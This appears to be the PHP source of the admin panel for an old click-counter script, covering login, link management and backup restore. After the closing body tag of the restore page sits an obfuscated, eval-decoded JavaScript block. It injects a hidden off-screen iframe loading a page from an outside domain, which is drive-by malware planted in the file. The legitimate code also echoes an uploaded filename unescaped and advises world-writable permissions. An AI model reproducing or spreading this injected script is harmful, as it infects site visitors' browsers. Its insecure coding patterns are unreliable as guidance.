<?php
# PHP click counter (CCount) - admin panel
# Version: 1.1
# File name: index.php
# Written 22nd January 2005 by Klemen Stirn (info@phpjunkyard.com)
# http://www.PHPJunkYard.com

##############################################################################
# COPYRIGHT NOTICE                                                           #
# Copyright 2004-2005 PHPJunkYard All Rights Reserved.                       #
#                                                                            #
# The CCount may be used and modified free of charge by anyone so long as    #
# this copyright notice and the comments above remain intact. By using this  #
# code you agree to indemnify Klemen Stirn from any liability that might     #
# arise from it's use.                                                       #
#                                                                            #
# Selling the code for this program without prior written consent is         #
# expressly forbidden. In other words, please ask first before you try and   #
# make money off this program.                                               #
#                                                                            #
# Obtain permission before redistributing this software over the Internet or #
# in any other medium. In all cases copyright and header must remain intact. #
# This Copyright is in full effect in any country that has International     #
# Trade Agreements with the United States of America or with                 #
# the European Union.                                                        #
##############################################################################

#############################
#     DO NOT EDIT BELOW     #
#############################

error_reporting(E_ALL ^ E_NOTICE);

require_once "settings.php";
if($settings['system'] == 2) {$settings['newline']="\r\n";}
elseif($settings['system'] == 3) {$settings['newline']="\r";}
else {$settings['newline']="\n";}

/* Start user session or output an error */
if (!session_start())
{
error("Cannot start a new PHP session. Please contact server administrator or webmaster!");
}

/* If no action parameter is set let's force visitor to login */
if (empty($_REQUEST['action']))
{
	if (isset($_SESSION['logged']) && $_SESSION['logged'] == "Y")
    {
    	mainpage();
    }
    else
    {
		login();
    }
}
else
{
$action=htmlspecialchars($_REQUEST['action']);
}

/* Do the action that is set in $action variable */
if ($action == "login")
	{
	checkpassword();
    $_SESSION['logged']="Y";
    mainpage("welcome");
	}
elseif ($action == "remove")
	{
	checklogin();
    $id=checkid();
    removelink($id);
	}
elseif ($action == "reset")
	{
    checklogin();
    $id=checkid();
    resetlink($id);
	}
elseif ($action == "add")
	{
	checklogin();
    $url=checkurl($_POST['url']);
    add($url);
	}
elseif ($action == "restore")
	{
	checklogin();
    restore();
	}
elseif ($action == "logout")
	{
	logout();
	}
else {login();}
exit();

function restore() {
global $settings;
$ext = strtolower(substr(strrchr($_FILES['backup']['name'], "."), 1));
if ($ext != "txt") {error("This doesn't seem to be the right backup file. CCount
backup file should be named <b>$settings[logfile]</b>!");}

    if (@move_uploaded_file($_FILES['backup']['tmp_name'], $settings['logfile']))
    {
    }
    else
    {
		error("There has been an error uploading the backup file! Please make
        sure your CCount directory is world-writable. On UNIX machines CHMOD
        it to 777 (rwx-rwx-rwx)!");
    }

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1250">
<link rel="STYLESHEET" type="text/css" href="style.css">
<title>PHP Click counter admin panel</title>
</head>
<body>
<div align="center"><center>
<table border="0" width="700">
<tr>
<td align="center" class="glava"><font class="header">PHP Click counter <?php echo($settings['verzija']); ?><br>-- Admin panel --</font></td>
</tr>
<tr>
<td class="vmes"><p>&nbsp;</p>
<div align="center"><center>
<table width="400" cellpadding="3"> <tr>
<td align="center" class="head">Backup restored: <?php echo $_FILES['backup']['name']; ?></td>
</tr>
<tr>
<td class="dol">
<form>
<p>&nbsp;</p>
<p align="center"><b>Backup successfully restored!</b></p>
<p>Your backup has been successfully restored. If this was a valid CCount
backup file your counter should work OK now!</p>
<p>&nbsp;</p>
<p align="center">
<a href="index.php?<?php echo strip_tags (SID)?>">
Click to continue</a></p>
<p>&nbsp;</p>
</td>
</tr> </table>
</div></center>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</td>
</tr>
<tr>
<!--
Changing the "Powered by" credit sentence without purchasing a licence is illegal!
Please visit http://www.phpjunkyard.com/copyright-removal.php for more information.
-->
<td align="center" class="copyright">Powered by <a href="http://www.phpjunkyard.com/php-click-counter.php" target="_new">PHP click counter</a> <?php echo($settings['verzija']); ?><br>
(c) Copyright 2004-2005 <a href="http://www.phpjunkyard.com/" target="_new">PHPjunkyard - Free PHP scripts</a></td>
</tr>
</table>
</div></center>
</body>
   <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . --> </html>    
<?php
exit();
}
// END error() //

?>